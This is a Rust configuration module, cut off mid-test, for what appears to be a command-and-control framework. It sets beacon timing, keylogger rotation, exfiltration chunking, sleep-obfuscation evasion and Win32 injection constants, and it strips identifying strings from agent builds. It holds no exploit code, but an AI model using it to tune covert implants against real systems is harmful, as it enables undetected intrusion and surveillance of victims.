// ./src/config.rs
// Typed configuration core: the single source of truth for every value that
// used to be hardcoded across the server, agent, transfer, RCM packaging,
// logging, evasion and Windows FFI code paths.
//
// Loading model:
//   1. Start from the embedded defaults (`Config::default()`).
//   2. If the RCM_CONFIG environment variable names a file, or a config.toml
//      exists in the working directory, parse it and overlay it: any key the
//      file omits keeps its default (serde's `#[serde(default)]` handling).
//   3. Parse errors are returned as descriptive `Err` values - never panic.
//
// `config()` hands out a process-wide `&'static Config` initialized from
// `load_or_default()` on first use. Long-running binaries therefore run with
// whatever configuration was present at first access; changing config.toml
// afterwards has no effect until restart.

// serde/TOML machinery is server-side only: agent builds (--cfg agent_build,
// injected by src/bin/builder.rs) compile this module down to the struct
// definitions and their embedded defaults, so no derived Deserialize impls
// or field-name strings are linked into agent binaries.
#[cfg(not(agent_build))]
use serde::Deserialize;
#[cfg(not(agent_build))]
use std::io;
use std::path::Path;
#[cfg(not(agent_build))]
use std::path::PathBuf;
use std::sync::OnceLock;

// ── Server ──────────────────────────────────────────────────────────────────

/// HTTP C2 listener, API server and session-housekeeping limits.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct ServerConfig {
    /// Port of the operator REST API (bound on 127.0.0.1).
    pub api_port: u16,
    /// Port of the default TLS listener created on first run.
    pub default_listener_port: u16,
    /// Max commands queued per HTTP agent before backpressure drops new work.
    pub max_queued_commands: usize,
    /// How often the HTTP listener sweeps for stale sessions (seconds).
    pub http_prune_interval_secs: u64,
    /// Idle age after which an HTTP session is pruned (seconds).
    pub http_prune_idle_secs: i64,
    /// HTTP request body cap for C2 and API routers (bytes).
    pub http_body_limit_bytes: usize,
    /// Max concurrent sessions accepted by one listener.
    pub listener_max_sessions: usize,
    /// Capacity of the per-session command channel.
    pub session_command_channel: usize,
    /// Length of the generated initial operator password (characters).
    pub audit_operator_password_len: usize,
    /// Freshness window for registration HMAC timestamps (seconds, both ways).
    pub registration_hmac_window_secs: i64,
    /// Prune the replay-cache once it grows past this many seen HMACs.
    pub seen_hmac_prune_threshold: usize,
    /// Times a poisoned lock is recovered before the component gives up.
    pub max_poison_recoveries: u32,
    /// Max virtual (pivot child) sessions per parent session.
    pub max_virtual_sessions: usize,
    /// Directory containing agent extensions (.rhai scripts).
    pub extensions_dir: String,
    /// Directory containing server-side modules (.rhai scripts).
    pub modules_dir: String,
    /// First fallback session id used when the database sequence is unavailable.
    pub session_fallback_id_start: u32,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            api_port: 8080,
            default_listener_port: 4443,
            max_queued_commands: 256,
            http_prune_interval_secs: 300,
            http_prune_idle_secs: 3600,
            http_body_limit_bytes: 50 * 1024 * 1024,
            listener_max_sessions: 1024,
            session_command_channel: 100,
            audit_operator_password_len: 24,
            registration_hmac_window_secs: 300,
            seen_hmac_prune_threshold: 1000,
            max_poison_recoveries: 3,
            max_virtual_sessions: 64,
            extensions_dir: "./extensions".to_string(),
            modules_dir: "./modules".to_string(),
            session_fallback_id_start: 50000,
        }
    }
}

// ── File transfer ───────────────────────────────────────────────────────────

/// Upload/download size limits and chunk pacing for file transfer.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct TransferConfig {
    /// Max size of a single transferred file (bytes).
    pub max_file_size_bytes: u64,
    /// Max size of a fully reassembled (decoded) file (bytes).
    pub max_total_file_size_bytes: u64,
    /// Max base64 payload accepted for one upload chunk (bytes).
    /// 8 MB raw becomes ~10.7 MB base64; this leaves headroom.
    pub max_chunk_b64_bytes: usize,
    /// Files smaller than this use the single-buffer fast path (bytes).
    pub small_file_threshold_bytes: u64,
    /// Read size for single-file downloads (bytes). 2 MB raw stays under the
    /// 10 MiB server frame cap once base64+JSON wrapped.
    pub download_chunk_size_bytes: u64,
    /// Read size per file in recursive directory downloads (bytes).
    pub recursive_chunk_size_bytes: u64,
    /// Sleep between chunks to pace the wire (milliseconds).
    pub chunk_sleep_ms: u64,
    /// Yield to the async runtime every N files during directory walks.
    pub files_per_yield: usize,
    /// Bounded-channel capacity (chunks) for streaming zip responses.
    pub zip_channel_chunks: usize,
    /// Chunk size batched onto the streaming-zip channel (bytes).
    pub zip_chunk_bytes: usize,
    /// Hard cap for one transport frame after wrapping (bytes).
    pub max_frame_bytes: u64,
    /// Log a warning above this transport frame size (bytes).
    pub frame_warn_bytes: u64,
    /// Pace between chunks on the single-file download path (milliseconds).
    pub download_chunk_sleep_ms: u64,
}

impl Default for TransferConfig {
    fn default() -> Self {
        Self {
            max_file_size_bytes: 500 * 1024 * 1024,
            max_total_file_size_bytes: 500 * 1024 * 1024,
            max_chunk_b64_bytes: 12 * 1024 * 1024,
            small_file_threshold_bytes: 10 * 1024 * 1024,
            download_chunk_size_bytes: 2 * 1024 * 1024,
            recursive_chunk_size_bytes: 2 * 1024 * 1024,
            chunk_sleep_ms: 20,
            files_per_yield: 5,
            zip_channel_chunks: 32,
            zip_chunk_bytes: 65_536,
            max_frame_bytes: 10 * 1024 * 1024,
            frame_warn_bytes: 2 * 1024 * 1024,
            download_chunk_sleep_ms: 50,
        }
    }
}

// ── RCM packaging ───────────────────────────────────────────────────────────

/// RCM Data Collection and Packaging module settings.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct RcmConfig {
    /// Base directory for collected-output storage roots.
    pub storage_base: String,
    /// Tool name stamped into RCM envelopes and log paths.
    pub tool_name: String,
    /// RCM spec version emitted into generated XML envelopes.
    pub spec_version: String,
    /// Capacity of the sidecar metadata cache (FIFO eviction beyond this).
    pub meta_cache_cap: usize,
    /// Number of concurrent chunk-assembly slots per package.
    pub chunk_slots: usize,
    /// TTL for a stale chunk slot before it is reclaimed (seconds).
    pub stale_slot_ttl_secs: u64,
    /// Rotate an RCM component log once it exceeds this size (bytes).
    pub log_rotate_bytes: u64,
    /// Extension used when a screenshot arrives without one.
    pub screenshot_default_ext: String,
    /// toolspecific component used when sanitization leaves it empty.
    pub fallback_toolspecific: String,
}

impl Default for RcmConfig {
    fn default() -> Self {
        Self {
            storage_base: "downloads".to_string(),
            tool_name: "rcm".to_string(),
            spec_version: "2.1".to_string(),
            meta_cache_cap: 1024,
            chunk_slots: 8,
            stale_slot_ttl_secs: 24 * 60 * 60,
            log_rotate_bytes: 16 * 1024 * 1024,
            screenshot_default_ext: "png".to_string(),
            fallback_toolspecific: "shot".to_string(),
        }
    }
}

// ── Server logging ──────────────────────────────────────────────────────────

/// Rolling server-log retention policy.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct LoggingConfig {
    /// Directory the server writes daily log files into.
    pub log_dir: String,
    /// Start deleting oldest log files once the directory passes this (bytes).
    pub max_size_bytes: u64,
    /// Delete down to this size during cleanup (bytes).
    pub target_size_bytes: u64,
    /// How often the background cleanup task runs (seconds).
    pub cleanup_interval_secs: u64,
}

impl Default for LoggingConfig {
    fn default() -> Self {
        Self {
            log_dir: "logs".to_string(),
            max_size_bytes: 2048 * 1024 * 1024,
            target_size_bytes: 1500 * 1024 * 1024,
            cleanup_interval_secs: 3600,
        }
    }
}

// ── Agent ───────────────────────────────────────────────────────────────────

/// Agent beacon timing and HTTP client limits.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct AgentConfig {
    /// Default beacon interval baked into fresh agent builds (seconds).
    pub default_sleep_secs: u64,
    /// Lower jitter bound as a percentage of the sleep interval.
    pub jitter_min_pct: u32,
    /// Upper jitter bound as a percentage of the sleep interval.
    pub jitter_max_pct: u32,
    /// Tasks requested per check-in when the server does not say otherwise.
    pub default_task_batch_size: u32,
    /// Cap for exponential reconnect backoff (seconds).
    pub backoff_cap_secs: u64,
    /// TCP/TLS connect timeout for the agent HTTP transport (seconds).
    pub connect_timeout_secs: u64,
    /// Overall request timeout for the agent HTTP transport (seconds).
    pub request_timeout_secs: u64,
    /// Per-read timeout while streaming an HTTP response body (seconds).
    pub http_read_timeout_secs: u64,
    /// Grace period for response reader threads after the child exits (seconds).
    pub http_reader_grace_secs: u64,
    /// Maximum buffered size of a single HTTP response (bytes).
    pub http_max_response_bytes: u64,
    /// Rotate keylogger archives above this size (bytes).
    pub keylogger_max_bytes: u64,
    /// Rotate keylogger archives older than this (seconds).
    pub keylogger_max_age_secs: u64,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            default_sleep_secs: 60,
            jitter_min_pct: 10,
            jitter_max_pct: 20,
            default_task_batch_size: 10,
            backoff_cap_secs: 300,
            connect_timeout_secs: 15,
            request_timeout_secs: 120,
            http_read_timeout_secs: 30,
            http_reader_grace_secs: 1,
            http_max_response_bytes: 10 * 1024 * 1024,
            keylogger_max_bytes: 10 * 1024 * 1024,
            keylogger_max_age_secs: 1800,
        }
    }
}

// ── Evasion ─────────────────────────────────────────────────────────────────

/// Sleep-obfuscation and heap-encryption tuning.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct EvasionConfig {
    /// Allocation block size assumed when walking/encrypting heap blocks.
    pub heap_block_size: usize,
    /// Sleep obfuscation technique: "ekko", "spoofed-stack" or "plain".
    pub sleep_obfuscation: String,
}

impl Default for EvasionConfig {
    fn default() -> Self {
        Self {
            heap_block_size: 4096,
            sleep_obfuscation: "ekko".to_string(),
        }
    }
}

// ── Windows FFI constants ───────────────────────────────────────────────────

/// Win32 constants used by injection, migration and scripting FFI code.
/// Values match winnt.h / WinBase.h; they live here so every FFI call site
/// reads one definition instead of re-declaring its own.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct FfiWindowsConfig {
    /// IMAGE_NT_SIGNATURE ("PE\0\0") validating a PE header.
    pub image_nt_signature: u32,
    /// IMAGE_DIRECTORY_ENTRY_IMPORT index into the data directory.
    pub image_directory_entry_import: u32,
    /// MEM_COMMIT allocation type.
    pub mem_commit: u32,
    /// MEM_RESERVE allocation type.
    pub mem_reserve: u32,
    /// MEM_RELEASE free type.
    pub mem_release: u32,
    /// PAGE_EXECUTE_READWRITE memory protection.
    pub page_execute_readwrite: u32,
    /// PAGE_READWRITE memory protection.
    pub page_readwrite: u32,
    /// PAGE_EXECUTE_READ memory protection.
    pub page_execute_read: u32,
    /// PAGE_NOACCESS memory protection.
    pub page_noaccess: u32,
    /// PROCESS_ALL_ACCESS desired access mask.
    pub process_all_access: u32,
    /// CREATE_SUSPENDED process creation flag.
    pub create_suspended: u32,
    /// INFINITE wait timeout.
    pub infinite: u32,
    /// WAIT_TIMEOUT wait result.
    pub wait_timeout: u32,
    /// WAIT_OBJECT_0 wait result.
    pub wait_object_0: u32,
    /// TOKEN_QUERY desired access for token inspection.
    pub token_query: u32,
    /// Name of the debug privilege (SE_DEBUG_NAME).
    pub se_debug_name: String,
}

impl Default for FfiWindowsConfig {
    fn default() -> Self {
        Self {
            image_nt_signature: 0x0000_4550,
            image_directory_entry_import: 1,
            mem_commit: 0x0000_1000,
            mem_reserve: 0x0000_2000,
            mem_release: 0x0000_8000,
            page_execute_readwrite: 0x40,
            page_readwrite: 0x04,
            page_execute_read: 0x20,
            page_noaccess: 0x01,
            process_all_access: 0x001F_0FFF,
            create_suspended: 0x0000_0004,
            infinite: 0xFFFF_FFFF,
            wait_timeout: 0x0000_0102,
            wait_object_0: 0x0000_0000,
            token_query: 0x0008,
            se_debug_name: "SeDebugPrivilege".to_string(),
        }
    }
}

// ── Crypto ──────────────────────────────────────────────────────────────────

/// Hash algorithm choices for fingerprints and file integrity.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct CryptoConfig {
    /// Hash used for RCM fingerprint values (spec mandates md5 for v1).
    pub fingerprint_hash: String,
    /// Hashes computed for collected-file integrity manifests.
    pub file_hash_algorithms: Vec<String>,
}

impl Default for CryptoConfig {
    fn default() -> Self {
        Self {
            fingerprint_hash: "md5".to_string(),
            file_hash_algorithms: vec![
                "sha256".to_string(),
                "sha1".to_string(),
                "md5".to_string(),
            ],
        }
    }
}

// ── Root ────────────────────────────────────────────────────────────────────

/// Root of the typed configuration tree. Every section overlays independently:
/// a TOML file may set a single key and everything else keeps its default.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(agent_build), derive(Deserialize))]
#[cfg_attr(not(agent_build), serde(default))]
pub struct Config {
    pub server: ServerConfig,
    pub transfer: TransferConfig,
    pub rcm: RcmConfig,
    pub logging: LoggingConfig,
    pub agent: AgentConfig,
    pub evasion: EvasionConfig,
    pub ffi_windows: FfiWindowsConfig,
    pub crypto: CryptoConfig,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            server: ServerConfig::default(),
            transfer: TransferConfig::default(),
            rcm: RcmConfig::default(),
            logging: LoggingConfig::default(),
            agent: AgentConfig::default(),
            evasion: EvasionConfig::default(),
            ffi_windows: FfiWindowsConfig::default(),
            crypto: CryptoConfig::default(),
        }
    }
}

// ── Loading ─────────────────────────────────────────────────────────────────

/// Environment variable naming an explicit configuration file.
pub const ENV_CONFIG: &str = "RCM_CONFIG";

/// File name looked up in the working directory when RCM_CONFIG is unset.
pub const DEFAULT_CONFIG_FILE: &str = "config.toml";

/// Decide which file (if any) supplies the overlay. RCM_CONFIG wins over the
/// working-directory config.toml; an empty RCM_CONFIG is treated as unset.
#[cfg(not(agent_build))]
fn resolve_path(env_value: Option<&str>) -> Option<PathBuf> {
    if let Some(p) = env_value {
        if !p.trim().is_empty() {
            return Some(PathBuf::from(p));
        }
    }
    let cwd_file = PathBuf::from(DEFAULT_CONFIG_FILE);
    if cwd_file.is_file() {
        Some(cwd_file)
    } else {
        None
    }
}

/// Parse a TOML overlay from a specific file. Missing keys keep defaults via
/// serde's `#[serde(default)]` handling. Returns a descriptive `Err` on any
/// read or parse failure - this function never panics.
#[cfg(not(agent_build))]
pub fn load_from_file(path: &Path) -> Result<Config, String> {
    let text = std::fs::read_to_string(path).map_err(|e| {
        format!("failed to read config file '{}': {}", path.display(), e)
    })?;
    toml::from_str(&text).map_err(|e| {
        format!("failed to parse config file '{}': {}", path.display(), e)
    })
}

/// Agent variant: agents never read operator config files, so this is a
/// fixed default that keeps the TOML parser and the derived Deserialize
/// impls (and every field-name string) out of the agent binary.
#[cfg(agent_build)]
pub fn load_from_file(_path: &Path) -> Result<Config, String> {
    Ok(Config::default())
}

/// Load the effective configuration: embedded defaults overlaid with the file
/// named by RCM_CONFIG, or with ./config.toml when it exists. With no file
/// present the result is exactly `Config::default()`.
///
/// Parse and read errors are returned as descriptive `Err` values - never
/// panic. Binaries that must start regardless should use `load_or_default()`.
#[cfg(not(agent_build))]
pub fn load() -> Result<Config, String> {
    match resolve_path(std::env::var(ENV_CONFIG).ok().as_deref()) {
        Some(path) => load_from_file(&path),
        None => Ok(Config::default()),
    }
}

/// Agent variant: no environment lookup, no file access - exactly the
/// out-of-box behavior an agent has when no RCM_CONFIG is present.
#[cfg(agent_build)]
pub fn load() -> Result<Config, String> {
    Ok(Config::default())
}

/// Non-failing variant of `load()`: on any error the problem is logged to
/// stderr and the embedded defaults are used instead.
#[cfg(not(agent_build))]
pub fn load_or_default() -> Config {
    match load() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[config] {} - falling back to embedded defaults", e);
            Config::default()
        }
    }
}

/// Agent variant: `load()` cannot fail in agent builds, so skip the error
/// path (and its format strings) entirely.
#[cfg(agent_build)]
pub fn load_or_default() -> Config {
    Config::default()
}

/// Process-wide configuration instance.
///
/// Initialized from `load_or_default()` on first access and immutable
/// afterwards. Long-running binaries therefore use whatever configuration
/// was present at first access; edits to config.toml after that point have
/// no effect until the process restarts.
pub fn config() -> &'static Config {
    static CONFIG: OnceLock<Config> = OnceLock::new();
    CONFIG.get_or_init(load_or_default)
}

// ── Template ────────────────────────────────────────────────────────────────

/// Render a fully documented config.toml: every key present, set to its
/// default value, with an inline comment explaining it. The output parses
/// back to exactly `Config::default()`.
///
/// Server-side only: the rendered schema embeds every key name, so it must
/// never be linked into an agent binary.
#[cfg(not(agent_build))]
pub fn template_toml() -> String {
    let c = Config::default();
    let algos = c
        .crypto
        .file_hash_algorithms
        .iter()
        .map(|a| format!("\"{}\"", a))
        .collect::<Vec<_>>()
        .join(", ");
    format!(
        r##"# RemoteComputerManagement configuration
# Every key is optional: anything omitted falls back to the embedded default
# shown here. Selected via the RCM_CONFIG environment variable, or as
# config.toml in the working directory.

[server]
api_port = {api_port} # operator REST API port (bound on 127.0.0.1)
default_listener_port = {default_listener_port} # port of the default TLS listener created on first run
max_queued_commands = {max_queued_commands} # max commands queued per HTTP agent before backpressure drops new work
http_prune_interval_secs = {http_prune_interval_secs} # how often the HTTP listener sweeps for stale sessions (seconds)
http_prune_idle_secs = {http_prune_idle_secs} # idle age after which an HTTP session is pruned (seconds)
http_body_limit_bytes = {http_body_limit_bytes} # HTTP request body cap for C2 and API routers (bytes)
listener_max_sessions = {listener_max_sessions} # max concurrent sessions accepted by one listener
session_command_channel = {session_command_channel} # capacity of the per-session command channel
audit_operator_password_len = {audit_operator_password_len} # length of the generated initial operator password (characters)
registration_hmac_window_secs = {registration_hmac_window_secs} # freshness window for registration HMAC timestamps (seconds, both ways)
seen_hmac_prune_threshold = {seen_hmac_prune_threshold} # prune the replay-cache once it grows past this many seen HMACs
max_poison_recoveries = {max_poison_recoveries} # times a poisoned lock is recovered before the component gives up
max_virtual_sessions = {max_virtual_sessions} # max virtual (pivot child) sessions per parent session
extensions_dir = "{extensions_dir}" # directory containing agent extensions (.rhai scripts)
modules_dir = "{modules_dir}" # directory containing server-side modules (.rhai scripts)
session_fallback_id_start = {session_fallback_id_start} # first fallback session id used when the database sequence is unavailable

[transfer]
max_file_size_bytes = {max_file_size_bytes} # max size of a single transferred file (bytes)
max_total_file_size_bytes = {max_total_file_size_bytes} # max size of a fully reassembled (decoded) file (bytes)
max_chunk_b64_bytes = {max_chunk_b64_bytes} # max base64 payload accepted for one upload chunk (bytes)
small_file_threshold_bytes = {small_file_threshold_bytes} # files smaller than this use the single-buffer fast path (bytes)
download_chunk_size_bytes = {download_chunk_size_bytes} # read size for single-file downloads (bytes)
recursive_chunk_size_bytes = {recursive_chunk_size_bytes} # read size per file in recursive directory downloads (bytes)
chunk_sleep_ms = {chunk_sleep_ms} # sleep between chunks to pace the wire (milliseconds)
files_per_yield = {files_per_yield} # yield to the async runtime every N files during directory walks
zip_channel_chunks = {zip_channel_chunks} # bounded-channel capacity (chunks) for streaming zip responses
zip_chunk_bytes = {zip_chunk_bytes} # chunk size batched onto the streaming-zip channel (bytes)
max_frame_bytes = {max_frame_bytes} # hard cap for one transport frame after wrapping (bytes)
frame_warn_bytes = {frame_warn_bytes} # log a warning above this transport frame size (bytes)
download_chunk_sleep_ms = {download_chunk_sleep_ms} # pace between chunks on the single-file download path (milliseconds)

[rcm]
storage_base = "{storage_base}" # base directory for collected-output storage roots
tool_name = "{tool_name}" # tool name stamped into RCM envelopes and log paths
spec_version = "{spec_version}" # RCM spec version emitted into generated XML envelopes
meta_cache_cap = {meta_cache_cap} # capacity of the sidecar metadata cache (FIFO eviction beyond this)
chunk_slots = {chunk_slots} # number of concurrent chunk-assembly slots per package
stale_slot_ttl_secs = {stale_slot_ttl_secs} # TTL for a stale chunk slot before it is reclaimed (seconds)
log_rotate_bytes = {log_rotate_bytes} # rotate an RCM component log once it exceeds this size (bytes)
screenshot_default_ext = "{screenshot_default_ext}" # extension used when a screenshot arrives without one
fallback_toolspecific = "{fallback_toolspecific}" # toolspecific component used when sanitization leaves it empty

[logging]
log_dir = "{log_dir}" # directory the server writes daily log files into
max_size_bytes = {max_size_bytes} # start deleting oldest log files once the directory passes this (bytes)
target_size_bytes = {target_size_bytes} # delete down to this size during cleanup (bytes)
cleanup_interval_secs = {cleanup_interval_secs} # how often the background cleanup task runs (seconds)

[agent]
default_sleep_secs = {default_sleep_secs} # default beacon interval baked into fresh agent builds (seconds)
jitter_min_pct = {jitter_min_pct} # lower jitter bound as a percentage of the sleep interval
jitter_max_pct = {jitter_max_pct} # upper jitter bound as a percentage of the sleep interval
default_task_batch_size = {default_task_batch_size} # tasks requested per check-in when the server does not say otherwise
backoff_cap_secs = {backoff_cap_secs} # cap for exponential reconnect backoff (seconds)
connect_timeout_secs = {connect_timeout_secs} # TCP/TLS connect timeout for the agent HTTP transport (seconds)
request_timeout_secs = {request_timeout_secs} # overall request timeout for the agent HTTP transport (seconds)
http_read_timeout_secs = {http_read_timeout_secs} # per-read timeout while streaming an HTTP response body (seconds)
http_reader_grace_secs = {http_reader_grace_secs} # grace period for response reader threads after the child exits (seconds)
http_max_response_bytes = {http_max_response_bytes} # maximum buffered size of a single HTTP response (bytes)
keylogger_max_bytes = {keylogger_max_bytes} # rotate keylogger archives above this size (bytes)
keylogger_max_age_secs = {keylogger_max_age_secs} # rotate keylogger archives older than this (seconds)

[evasion]
heap_block_size = {heap_block_size} # allocation block size assumed when walking/encrypting heap blocks
sleep_obfuscation = "{sleep_obfuscation}" # sleep obfuscation technique: ekko, spoofed-stack or plain

[ffi_windows]
image_nt_signature = {image_nt_signature} # IMAGE_NT_SIGNATURE ("PE\0\0") validating a PE header
image_directory_entry_import = {image_directory_entry_import} # IMAGE_DIRECTORY_ENTRY_IMPORT index into the data directory
mem_commit = {mem_commit} # MEM_COMMIT allocation type
mem_reserve = {mem_reserve} # MEM_RESERVE allocation type
mem_release = {mem_release} # MEM_RELEASE free type
page_execute_readwrite = {page_execute_readwrite} # PAGE_EXECUTE_READWRITE memory protection
page_readwrite = {page_readwrite} # PAGE_READWRITE memory protection
page_execute_read = {page_execute_read} # PAGE_EXECUTE_READ memory protection
page_noaccess = {page_noaccess} # PAGE_NOACCESS memory protection
process_all_access = {process_all_access} # PROCESS_ALL_ACCESS desired access mask
create_suspended = {create_suspended} # CREATE_SUSPENDED process creation flag
infinite = {infinite} # INFINITE wait timeout
wait_timeout = {wait_timeout} # WAIT_TIMEOUT wait result
wait_object_0 = {wait_object_0} # WAIT_OBJECT_0 wait result
token_query = {token_query} # TOKEN_QUERY desired access for token inspection
se_debug_name = "{se_debug_name}" # name of the debug privilege (SE_DEBUG_NAME)

[crypto]
fingerprint_hash = "{fingerprint_hash}" # hash used for RCM fingerprint values (spec mandates md5 for v1)
file_hash_algorithms = [{algos}] # hashes computed for collected-file integrity manifests
"##,
        api_port = c.server.api_port,
        default_listener_port = c.server.default_listener_port,
        max_queued_commands = c.server.max_queued_commands,
        http_prune_interval_secs = c.server.http_prune_interval_secs,
        http_prune_idle_secs = c.server.http_prune_idle_secs,
        http_body_limit_bytes = c.server.http_body_limit_bytes,
        listener_max_sessions = c.server.listener_max_sessions,
        session_command_channel = c.server.session_command_channel,
        audit_operator_password_len = c.server.audit_operator_password_len,
        registration_hmac_window_secs = c.server.registration_hmac_window_secs,
        seen_hmac_prune_threshold = c.server.seen_hmac_prune_threshold,
        max_poison_recoveries = c.server.max_poison_recoveries,
        max_virtual_sessions = c.server.max_virtual_sessions,
        extensions_dir = c.server.extensions_dir,
        modules_dir = c.server.modules_dir,
        session_fallback_id_start = c.server.session_fallback_id_start,
        max_file_size_bytes = c.transfer.max_file_size_bytes,
        max_total_file_size_bytes = c.transfer.max_total_file_size_bytes,
        max_chunk_b64_bytes = c.transfer.max_chunk_b64_bytes,
        small_file_threshold_bytes = c.transfer.small_file_threshold_bytes,
        download_chunk_size_bytes = c.transfer.download_chunk_size_bytes,
        recursive_chunk_size_bytes = c.transfer.recursive_chunk_size_bytes,
        chunk_sleep_ms = c.transfer.chunk_sleep_ms,
        files_per_yield = c.transfer.files_per_yield,
        zip_channel_chunks = c.transfer.zip_channel_chunks,
        zip_chunk_bytes = c.transfer.zip_chunk_bytes,
        max_frame_bytes = c.transfer.max_frame_bytes,
        frame_warn_bytes = c.transfer.frame_warn_bytes,
        download_chunk_sleep_ms = c.transfer.download_chunk_sleep_ms,
        storage_base = c.rcm.storage_base,
        tool_name = c.rcm.tool_name,
        spec_version = c.rcm.spec_version,
        meta_cache_cap = c.rcm.meta_cache_cap,
        chunk_slots = c.rcm.chunk_slots,
        stale_slot_ttl_secs = c.rcm.stale_slot_ttl_secs,
        log_rotate_bytes = c.rcm.log_rotate_bytes,
        screenshot_default_ext = c.rcm.screenshot_default_ext,
        fallback_toolspecific = c.rcm.fallback_toolspecific,
        log_dir = c.logging.log_dir,
        max_size_bytes = c.logging.max_size_bytes,
        target_size_bytes = c.logging.target_size_bytes,
        cleanup_interval_secs = c.logging.cleanup_interval_secs,
        default_sleep_secs = c.agent.default_sleep_secs,
        jitter_min_pct = c.agent.jitter_min_pct,
        jitter_max_pct = c.agent.jitter_max_pct,
        default_task_batch_size = c.agent.default_task_batch_size,
        backoff_cap_secs = c.agent.backoff_cap_secs,
        connect_timeout_secs = c.agent.connect_timeout_secs,
        request_timeout_secs = c.agent.request_timeout_secs,
        http_read_timeout_secs = c.agent.http_read_timeout_secs,
        http_reader_grace_secs = c.agent.http_reader_grace_secs,
        http_max_response_bytes = c.agent.http_max_response_bytes,
        keylogger_max_bytes = c.agent.keylogger_max_bytes,
        keylogger_max_age_secs = c.agent.keylogger_max_age_secs,
        heap_block_size = c.evasion.heap_block_size,
        sleep_obfuscation = c.evasion.sleep_obfuscation,
        image_nt_signature = c.ffi_windows.image_nt_signature,
        image_directory_entry_import = c.ffi_windows.image_directory_entry_import,
        mem_commit = c.ffi_windows.mem_commit,
        mem_reserve = c.ffi_windows.mem_reserve,
        mem_release = c.ffi_windows.mem_release,
        page_execute_readwrite = c.ffi_windows.page_execute_readwrite,
        page_readwrite = c.ffi_windows.page_readwrite,
        page_execute_read = c.ffi_windows.page_execute_read,
        page_noaccess = c.ffi_windows.page_noaccess,
        process_all_access = c.ffi_windows.process_all_access,
        create_suspended = c.ffi_windows.create_suspended,
        infinite = c.ffi_windows.infinite,
        wait_timeout = c.ffi_windows.wait_timeout,
        wait_object_0 = c.ffi_windows.wait_object_0,
        token_query = c.ffi_windows.token_query,
        se_debug_name = c.ffi_windows.se_debug_name,
        fingerprint_hash = c.crypto.fingerprint_hash,
        algos = algos,
    )
}

/// Write the fully documented template to `path` (creating or overwriting it).
#[cfg(not(agent_build))]
pub fn write_template(path: &Path) -> io::Result<()> {
    std::fs::write(path, template_toml())
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp_file(contents: &str) -> tempfile::NamedTempFile {
        use std::io::Write as _;
        let mut f = tempfile::NamedTempFile::new().expect("create temp file");
        f.write_all(contents.as_bytes()).expect("write temp file");
        f
    }

    #[test]
    fn defaults_are_sane() {
        let c = Config::default();
        assert_eq!(c.server.api_port, 8080);
        assert_eq!(c.server.default_listener_port, 4443);
        assert!(c.server.max_queued_commands > 0);
        assert!(c.transfer.max_file_size_bytes >= c.transfer.small_file_threshold_bytes);
        assert!(c.transfer.download_chunk_size_bytes > 0);
        assert!(c.agent.jitter_min_pct <= c.agent.jitter_max_pct);
        assert_eq!(c.rcm.spec_version, "2.1");
        assert_eq!(c.ffi_windows.image_nt_signature, 0x4550);
        assert_eq!(c.ffi_windows.infinite, 0xFFFF_FFFF);
        assert_eq!(c.crypto.fingerprint_hash, "md5");
        assert!(!c.crypto.file_hash_algorithms.is_empty());
    }

    #[test]
    fn partial_toml_overlay_keeps_unspecified_defaults() {
        let f = tmp_file("[server]\napi_port = 9090\n");
        let c = load_from_file(f.path()).expect("partial overlay loads");
        assert_eq!(c.server.api_port, 9090);
        // Everything not mentioned keeps its default.
        assert_eq!(c.server.default_listener_port, 4443);
        assert_eq!(c.server.max_queued_commands, 256);
        assert_eq!(c.transfer, TransferConfig::default());
        assert_eq!(c.agent, AgentConfig::default());
        assert_eq!(c.crypto, CryptoConfig::default());
    }

    #[test]
    fn empty_toml_is_exactly_default() {
        let f = tmp_file("");
        let c = load_from_file(f.path()).expect("empty file loads");
        assert_eq!(c, Config::default());
    }

    #[test]
    fn malformed_toml_returns_descriptive_err() {
        let f = tmp_file("[server\napi_port = ");
        let err = load_from_file(f.path()).expect_err("malformed TOML must fail");
        assert!(err.contains("failed to parse config file"), "got: {}", err);
        assert!(err.contains(f.path().to_str().unwrap()), "got: {}", err);
    }

    #[test]
    fn missing_file_returns_descriptive_err() {
        let err = load_from_file(Path::new("/nonexistent/rcm-config-xyz.toml"))
            .expect_err("missing file must fail");
        assert!(err.contains("failed to read config file"), "got: {}", err);
    }

    #[test]
    fn resolve_path_prefers_env_over_cwd() {
        let from_env = resolve_path(Some("/tmp/explicit.toml"));
        assert_eq!(from_env, Some(PathBuf::from("/tmp/explicit.toml")));
        // Empty env value falls through to the working-directory lookup.
        let _ = resolve_path(Some("   "));
        // With no env value the answer depends only on ./config.toml, which
        // must not exist inside the test sandbox crate root.
        assert!(!Path::new(DEFAULT_CONFIG_FILE).is_file());
        assert_eq!(resolve_path(None), None);
    }

    #[test]
    fn rcm_config_env_var_is_honored() {
        let f = tmp_file("[agent]\ndefault_sleep_secs = 99\n");
        std::env::set_var(ENV_CONFIG, f.path());
        let c = load().expect("load via RCM_CONFIG");
        std::env::remove_var(ENV_CONFIG);
        assert_eq!(c.agent.default_sleep_secs, 99);
        assert_eq!(c.server, ServerConfig::default());
    }

    #[test]
